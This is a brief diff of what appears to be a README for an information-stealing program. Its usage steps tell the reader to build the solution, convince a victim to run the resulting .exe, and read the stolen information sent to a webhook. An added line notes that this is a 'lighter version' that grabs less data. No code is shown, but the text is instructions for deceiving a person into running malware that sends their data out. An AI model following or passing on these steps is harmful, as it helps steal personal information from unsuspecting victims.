@@ -2,3 +2,5 @@
 - Build the solution
 - Convince your victim to run the .exe
 - The info will be displayed by the webhook
+
+THIS IS A LIGHTER VERSION, IT WILL GRAB LESS INFO
